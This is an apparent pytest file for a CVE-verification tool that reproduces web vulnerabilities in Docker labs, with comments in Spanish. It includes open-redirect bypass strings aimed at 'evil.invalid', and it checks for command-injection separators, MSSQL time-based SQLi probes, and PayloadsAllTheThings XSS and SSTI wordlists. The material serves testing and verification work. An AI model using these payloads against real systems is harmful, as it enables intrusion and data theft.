    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_file_upload(str(tmp_path), "/upload")
    assert res.available is False


def test_genericverify_file_upload_confirms_via_grep_inside_container(monkeypatch, tmp_path):
    # el punto central: la confirmacion viene de ENCONTRAR el fichero subido con el secreto
    # real DENTRO del contenedor (via `docker exec grep`), no de adivinar la URL publica donde
    # el servidor lo sirve (eso depende del stack y no se puede generalizar) -- y deja explicito
    # que esto NO confirma ejecucion, solo almacenamiento.
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def __init__(self):
            self.sh_calls = []
        def teardown(self):
            pass
        def sh(self, *args, **kw):
            self.sh_calls.append(args)
            class _R:
                stdout = "/var/www/html/uploads/poc.php.jpg\n"
                returncode = 0
            return _R()

    import time as _time_mod
    fake_lab = _FakeLab()
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (fake_lab, "http://lab.invalid", "app"))
    monkeypatch.setattr(gv, "_http_request", lambda *a, **kw: None)
    monkeypatch.setattr(_time_mod, "sleep", lambda *a: None)

    res = gv.verify_generic_file_upload(str(tmp_path), "/upload", file_param_hint="file")

    assert res.verified is True
    assert res.evidence.get("ruta_real_en_el_contenedor") == "/var/www/html/uploads/poc.php.jpg"
    assert "SUBIDA SIN RESTRICCION confirmada" in res.detail
    assert "NO" in res.detail and "ejecucion" in res.detail
    assert any("EJECUCION" in lim for lim in res.limitations)


def test_genericverify_file_upload_not_confirmed_when_grep_finds_nothing(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass
        def sh(self, *args, **kw):
            class _R:
                stdout = ""
                returncode = 0
            return _R()

    import time as _time_mod
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    monkeypatch.setattr(gv, "_http_request", lambda *a, **kw: None)
    monkeypatch.setattr(_time_mod, "sleep", lambda *a: None)

    res = gv.verify_generic_file_upload(str(tmp_path), "/upload")
    assert res.verified is False
    assert "no se confirmo subida sin restriccion" in res.detail


def test_cve_agent_dispatches_generic_file_upload_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_upload(local_path, endpoint, file_param_hint="", other_parameters=None,
                            on_step=None, budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="SUBIDA SIN RESTRICCION confirmada (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_file_upload", fake_generic_upload)

    inv = Investigation(cve_id="CVE-2099-00010")
    inv.vuln_class = "file-upload"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/upload", "http_method": "POST", "parameters": {"file": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/upload"
    assert inv.verified is True


def test_genericverify_idor_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_idor(str(tmp_path), "/view", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "ID" in res.limitations[0]


def test_genericverify_idor_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_idor(str(tmp_path), "/view", "GET", {"id": "1"},
                                 id_param_hint="id")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_idor_never_verified_even_on_real_difference(monkeypatch, tmp_path):
    # el punto central de esta version generica: aunque las dos respuestas difieran de verdad
    # (sin ningun error), NUNCA debe marcar `verified` -- no hay sesion autenticada de por medio,
    # asi que esto no confirma un IDOR real (acceso sin permiso al recurso de OTRO usuario),
    # solo que el ID resuelve contenido distinto. Mezclarlo con el nivel de prueba de WordPress/
    # Drupal/Joomla (dos cuentas reales) seria enganoso.
    import binoracle.workflows.genericverify as gv

    class _FakeLab:
        def teardown(self):
            pass

    class _R:
        def __init__(self, status_code, text):
            self.status_code = status_code
            self.text = text

    responses = {"1": _R(200, "<html>tu propio recurso, perfil A</html>"),
                "2": _R(200, "<html>recurso de otro usuario, perfil B, datos privados</html>")}

    def fake_http_request(method, url, **kw):
        params = kw.get("params") or kw.get("data") or {}
        return responses[params["id"]]

    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    monkeypatch.setattr(gv, "_bootstrap_generic_lab",
                        lambda *a, **kw: (_FakeLab(), "http://lab.invalid", "app"))
    monkeypatch.setattr(gv, "_http_request", fake_http_request)

    res = gv.verify_generic_idor(str(tmp_path), "/view", "GET", {"id": "1"},
                                 id_param_hint="id", own_id="1", victim_id="2")

    assert res.verified is False    # NUNCA, sea cual sea la diferencia observada
    assert res.ok is True
    assert res.evidence.get("diferencia_observada") is True
    assert "DIFERENCIA REAL observada" in res.detail
    assert "NO confirma" in res.detail
    assert any("NUNCA" in lim or "nunca" in lim for lim in res.limitations)


def test_genericverify_ssrf_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_ssrf(str(tmp_path), "/fetch", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "URL" in res.limitations[0]


def test_genericverify_ssrf_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_ssrf(str(tmp_path), "/fetch", "GET", {"url": "x"},
                                 url_param_hint="url")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_command_injection_blocked_without_docker_reuses_daemon_check(monkeypatch, tmp_path):
    # mismo chequeo _docker_daemon_ok compartido por las 3 clases genericas -- confirma que
    # path-traversal y ssrf tambien degradan limpio sin daemon, no solo command-injection.
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res_pt = gv.verify_generic_path_traversal(str(tmp_path), "/view", "GET", {"page": "x"})
    res_ssrf = gv.verify_generic_ssrf(str(tmp_path), "/fetch", "GET", {"url": "x"})
    assert res_pt.available is False
    assert res_ssrf.available is False


def test_cve_agent_dispatches_generic_path_traversal_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_pt(local_path, endpoint, method, params, path_param_hint="", on_step=None,
                        budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="PATH TRAVERSAL confirmado (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_path_traversal", fake_generic_pt)

    inv = Investigation(cve_id="CVE-2099-00002")
    inv.vuln_class = "path-traversal"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/view", "http_method": "GET", "parameters": {"page": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/view"
    assert inv.verified is True


def test_cve_agent_dispatches_generic_ssrf_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_ssrf(local_path, endpoint, method, params, url_param_hint="", on_step=None,
                          budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="SSRF confirmado (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_ssrf", fake_generic_ssrf)

    inv = Investigation(cve_id="CVE-2099-00003")
    inv.vuln_class = "ssrf"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/fetch", "http_method": "GET", "parameters": {"url": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/fetch"
    assert inv.verified is True


def test_cve_agent_dispatches_generic_idor_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_idor(local_path, endpoint, method, params, id_param_hint="", own_id="1",
                          victim_id="2", on_step=None, budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        res = WpVerifyResult(ok=True, available=True, verified=False,
                             detail="DIFERENCIA REAL observada (fake, nunca verificado)")
        return res
    monkeypatch.setattr(genericverify, "verify_generic_idor", fake_generic_idor)

    inv = Investigation(cve_id="CVE-2099-00009")
    inv.vuln_class = "idor"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/profile", "http_method": "GET", "parameters": {"id": "1"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/profile"
    assert inv.verified is False    # esta version nunca marca verified=True


def test_genericverify_sqli_blind_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_sqli_blind(str(tmp_path), "/item", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "parametro" in res.limitations[0]


def test_genericverify_sqli_blind_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_sqli_blind(str(tmp_path), "/item", "GET", {"id": "1"},
                                       sqli_param_hint="id")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_sqli_blind_blocked_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_sqli_blind(str(tmp_path), "/item", "GET", {"id": "1"})
    assert res.available is False
    assert res.verified is False


def test_cve_agent_dispatches_generic_sqli_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_sqli(local_path, endpoint, method, params, sqli_param_hint="", on_step=None,
                          budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="SQLI CIEGA POR TIEMPO confirmada (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_sqli_blind", fake_generic_sqli)

    inv = Investigation(cve_id="CVE-2099-00004")
    inv.vuln_class = "sqli"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/item", "http_method": "GET", "parameters": {"id": "1"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/item"
    assert inv.verified is True


def test_genericverify_xxe_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_xxe(str(tmp_path), "/import", "POST", {})
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_xxe_blocked_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_xxe(str(tmp_path), "/import", "POST", {})
    assert res.available is False
    assert res.verified is False


def test_genericverify_open_redirect_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_open_redirect(str(tmp_path), "/go", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "parametro" in res.limitations[0]


def test_genericverify_open_redirect_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_open_redirect(str(tmp_path), "/go", "GET", {"next": "/"},
                                          redirect_param_hint="next")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_open_redirect_blocked_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_open_redirect(str(tmp_path), "/go", "GET", {"next": "/"})
    assert res.available is False
    assert res.verified is False


def test_cve_agent_dispatches_generic_xxe_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_xxe(local_path, endpoint, method, params, xml_param_hint="", on_step=None,
                         budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="XXE confirmada (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_xxe", fake_generic_xxe)

    inv = Investigation(cve_id="CVE-2099-00005")
    inv.vuln_class = "xxe"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/import", "http_method": "POST", "parameters": {},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/import"
    assert inv.verified is True


def test_cve_agent_dispatches_generic_open_redirect_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_redir(local_path, endpoint, method, params, redirect_param_hint="",
                           on_step=None, budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="OPEN REDIRECT confirmado (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_open_redirect", fake_generic_redir)

    inv = Investigation(cve_id="CVE-2099-00006")
    inv.vuln_class = "open-redirect"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/go", "http_method": "GET", "parameters": {"next": "/"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/go"
    assert inv.verified is True


def test_genericverify_discover_http_accepts_4xx_status(monkeypatch):
    # confirmado en vivo: urlopen() LANZA HTTPError para 4xx/5xx en vez de devolverla -- un
    # objetivo que solo expone rutas POST (su raiz responde 404) tiene que seguir detectandose
    # como 'listo', no tratarse como si no hubiera arrancado.
    import urllib.error
    import binoracle.workflows.genericverify as gv

    lab = gv._GenericLab("test")
    lab.kind = "dockerfile"
    monkeypatch.setattr(lab, "running_containers", lambda: ["c1"])
    monkeypatch.setattr(lab, "published_ports", lambda c: ["1234"])

    def fake_urlopen(url, timeout=4):
        raise urllib.error.HTTPError(url, 404, "Not Found", {}, None)
    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)

    result = lab.discover_http(tries=1, delay=0)
    assert result == ("c1", "1234")


def test_genericverify_discover_http_rejects_5xx_status(monkeypatch):
    # un 5xx (a diferencia de un 4xx) puede significar que la app esta arriba pero rota de
    # verdad -- sigue contando como 'aun no listo', no como exito.
    import urllib.error
    import binoracle.workflows.genericverify as gv

    lab = gv._GenericLab("test")
    lab.kind = "dockerfile"
    monkeypatch.setattr(lab, "running_containers", lambda: ["c1"])
    monkeypatch.setattr(lab, "published_ports", lambda c: ["1234"])

    def fake_urlopen(url, timeout=4):
        raise urllib.error.HTTPError(url, 500, "Internal Server Error", {}, None)
    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)

    result = lab.discover_http(tries=1, delay=0)
    assert result is None


# --- integracion real de PayloadsAllTheThings: casuistica ampliada + fix de falso positivo en
# open redirect que esa misma ampliacion saco a la luz en vivo ---

def test_redirect_location_is_external_rejects_leading_slash_bypass_attempt():
    # el falso positivo real encontrado en vivo: '/https://evil.invalid/pwned' como Location es
    # una ruta RELATIVA al mismo origen para cualquier navegador (el '/' inicial la ancla ahi),
    # nunca una redireccion externa -- aunque el texto 'evil.invalid' aparezca en la cadena.
    from binoracle.workflows.wpverify import _redirect_location_is_external
    assert _redirect_location_is_external("/https://evil.invalid/pwned", "evil.invalid") is False


def test_redirect_location_is_external_accepts_real_external_redirect():
    from binoracle.workflows.wpverify import _redirect_location_is_external
    assert _redirect_location_is_external("https://evil.invalid/pwned", "evil.invalid") is True


def test_redirect_location_is_external_accepts_protocol_relative():
    from binoracle.workflows.wpverify import _redirect_location_is_external
    assert _redirect_location_is_external("//evil.invalid/pwned", "evil.invalid") is True


def test_redirect_location_is_external_resolves_userinfo_trick():
    from binoracle.workflows.wpverify import _redirect_location_is_external
    assert _redirect_location_is_external(
        "https://trusted.example.com@evil.invalid/pwned", "evil.invalid") is True


def test_redirect_location_is_external_normalizes_backslash():
    from binoracle.workflows.wpverify import _redirect_location_is_external
    assert _redirect_location_is_external(
        "https://evil.invalid\\@trusted.example.com/pwned", "evil.invalid") is True


def test_redirect_location_is_external_rejects_same_origin_path():
    from binoracle.workflows.wpverify import _redirect_location_is_external
    assert _redirect_location_is_external("/dashboard", "evil.invalid") is False
    assert _redirect_location_is_external("", "evil.invalid") is False


def test_genericverify_command_injection_separators_include_patt_casuistry():
    # confirma que la casuistica real de PayloadsAllTheThings (Command Injection/Intruder/
    # command_exec.txt) esta de verdad en el codigo, no solo mencionada -- ||, IFS, %09.
    import inspect
    from binoracle.workflows import genericverify
    src = inspect.getsource(genericverify.verify_generic_command_injection)
    assert "||" in src
    assert "${IFS}" in src
    assert "%09" in src


def test_genericverify_open_redirect_targets_include_patt_casuistry():
    import inspect
    from binoracle.workflows import genericverify
    src = inspect.getsource(genericverify.verify_generic_open_redirect)
    assert "///{evil_host}" in src
    assert "/https://{evil_host}" in src


def test_genericverify_sqli_blind_includes_mssql_waitfor_dialect():
    import inspect
    from binoracle.workflows import genericverify
    src = inspect.getsource(genericverify.verify_generic_sqli_blind)
    assert "WAITFOR DELAY" in src


# --- payload_kb.py: carga en tiempo de ejecucion de las wordlists reales de
# PayloadsAllTheThings committeadas en payload_kb/ ---

def test_payload_kb_load_xss_payloads_substitutes_marker():
    from binoracle.workflows import payload_kb
    payloads = payload_kb.load_xss_payloads("document.title='MARK'")
    assert len(payloads) > 100
    assert all("alert(" not in p for p in payloads)
    assert all("MARK" in p for p in payloads)


def test_payload_kb_load_xss_payloads_excludes_third_party_domains():
    from binoracle.workflows import payload_kb
    payloads = payload_kb.load_xss_payloads("document.title='MARK'")
    assert all("crowdshield.com" not in p and "xerosecurity.com" not in p for p in payloads)


def test_payload_kb_load_ssti_arithmetic_payloads_substitutes_operands():
    from binoracle.workflows import payload_kb
    pairs = payload_kb.load_ssti_arithmetic_payloads(37, 41)
    assert len(pairs) >= 6
    muls = [p for p, exp in pairs if exp == 37 * 41]
    adds = [p for p, exp in pairs if exp == 37 + 41]
    assert any("37*41" in p or "37*'41'" in p for p in muls)
    assert any("37+41" in p for p in adds)


def test_genericverify_xss_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_xss(str(tmp_path), "/greet", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "parametro" in res.limitations[0]


def test_genericverify_xss_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_xss(str(tmp_path), "/greet", "GET", {"name": "x"},
                                xss_param_hint="name")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_xss_blocked_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_xss(str(tmp_path), "/greet", "GET", {"name": "x"})
    assert res.available is False
    assert res.verified is False


def test_genericverify_ssti_blocked_without_param(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    res = gv.verify_generic_ssti(str(tmp_path), "/render", "GET", {})
    assert res.verified is False
    assert res.limitations
    assert "parametro" in res.limitations[0]


def test_genericverify_ssti_blocked_without_build_target(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: True)
    (tmp_path / "README.md").write_text("no docker here\n")
    res = gv.verify_generic_ssti(str(tmp_path), "/render", "GET", {"msg": "x"},
                                 ssti_param_hint="msg")
    assert res.verified is False
    assert res.limitations
    assert "Dockerfile" in res.limitations[0]


def test_genericverify_ssti_blocked_without_docker(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    monkeypatch.setattr(gv, "_docker_daemon_ok", lambda timeout=8.0: False)
    res = gv.verify_generic_ssti(str(tmp_path), "/render", "GET", {"msg": "x"})
    assert res.available is False
    assert res.verified is False


def test_cve_agent_dispatches_generic_xss_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_xss(local_path, endpoint, method, params, xss_param_hint="", on_step=None,
                         budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="XSS confirmado (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_xss", fake_generic_xss)

    inv = Investigation(cve_id="CVE-2099-00007")
    inv.vuln_class = "xss"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/greet", "http_method": "GET", "parameters": {"name": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/greet"
    assert inv.verified is True


def test_cve_agent_dispatches_generic_ssti_for_unrecognized_source(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource, genericverify

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(ok=True, kind="git", source=target,
                                           local_path=str(tmp_path), plugin_dir="")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    called = {}
    def fake_generic_ssti(local_path, endpoint, method, params, ssti_param_hint="", on_step=None,
                          budget_s=900.0):
        called["endpoint"] = endpoint
        from binoracle.workflows.wpverify import WpVerifyResult
        return WpVerifyResult(ok=True, available=True, verified=True,
                              detail="SSTI confirmada (fake)")
    monkeypatch.setattr(genericverify, "verify_generic_ssti", fake_generic_ssti)

    inv = Investigation(cve_id="CVE-2099-00008")
    inv.vuln_class = "ssti"
    inv.llm_notes = {"source_url": "https://example.com/some-generic-app.git",
                     "endpoint": "/render", "http_method": "GET", "parameters": {"msg": "x"},
                     "vulnerable_functions": []}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("endpoint") == "/render"
    assert inv.verified is True


# --- burpmcp.py: cliente MCP para la extension oficial de Burp Suite
# (github.com/PortSwigger/mcp-server) ---

def test_burpmcp_normalize_matches_any_casing():
    from binoracle.workflows.burpmcp import _normalize
    assert _normalize("SendHttp1Request") == _normalize("send_http1_request") == _normalize(
        "sendHttp1Request")


def test_burpmcp_parse_raw_http_response_basic():
    from binoracle.workflows.burpmcp import _parse_raw_http_response
    raw = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nServer: nginx\r\n\r\nhello world"
    res = _parse_raw_http_response(raw)
    assert res.status_code == 200
    assert res.reason == "OK"
    assert res.headers["Content-Type"] == "text/plain"
    assert res.text == "hello world"


def test_burpmcp_parse_raw_http_response_empty():
    from binoracle.workflows.burpmcp import _parse_raw_http_response
    res = _parse_raw_http_response("")
    assert res.status_code == 0


def test_burpmcp_parse_raw_http_response_unwraps_real_burp_echo_format():
    # bug real confirmado en vivo (CVE-2024-1071, login via Burp): la tool REAL de Burp no
    # devuelve solo la respuesta cruda -- devuelve un texto que trae de vuelta (eco de) la
    # peticion que mandamos, seguido de la respuesta real tras un marcador 'httpResponse='.
    # Antes de este fix, partition("\r\n\r\n") caia en el primer '\r\n\r\n' que encontraba, que
    # estaba DENTRO de nuestra propia peticion (entre sus cabeceras y su cuerpo POST) -- la
    # "status line" resultante era la primera linea de NUESTRA peticion ("POST /wp-login.php
    # HTTP/1.1"), que no hace match con el regex de respuesta, asi que status_code salia SIEMPRE
    # 0 y el Set-Cookie real (con la cookie de sesion de WordPress) se perdia -- aunque el login
    # funcionara perfectamente del otro lado. Texto reconstruido a partir del real que vio la
    # usuaria en su propia Burp.
    from binoracle.workflows.burpmcp import _parse_raw_http_response
    our_request = (
        "POST /wp-login.php HTTP/1.1\r\nHost: host.docker.internal:56133\r\n"
        "Connection: close\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 123\r\n\r\n"
        "log=binoracle_admin&pwd=h_UFsNk4AkWc-3EW&wp-submit=Log+In&"
        "redirect_to=http%3A%2F%2Fhost.docker.internal%3A56133%2Fwp-admin%2F&testcookie=1")
    real_response = (
        "HTTP/1.1 302 Found\r\nDate: Thu, 15 Oct 2026 13:44:05 GMT\r\n"
        "Set-Cookie: wordpress_logged_in_abc123=binoracle_admin%7C...; path=/\r\n"
        "Location: http://host.docker.internal:56133/wp-admin/\r\n\r\n")
    combined = our_request + ", httpResponse=" + real_response

    res = _parse_raw_http_response(combined)
    assert res.status_code == 302
    assert res.headers["Location"] == "http://host.docker.internal:56133/wp-admin/"
    assert res.set_cookie_headers == ["wordpress_logged_in_abc123=binoracle_admin%7C...; path=/"]
    # raw_response conserva el texto COMPLETO tal cual llego (util para depurar), no el recortado
    assert res.raw_response == combined


def test_burpmcp_parse_raw_http_response_without_echo_wrapper_still_works():
    # los servidores MCP de mentira usados en otros tests de este archivo SI devuelven solo la
    # respuesta cruda (sin el eco de la peticion) -- el fix no debe romper ese caso.
    from binoracle.workflows.burpmcp import _parse_raw_http_response
    raw = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nhello world"
    res = _parse_raw_http_response(raw)
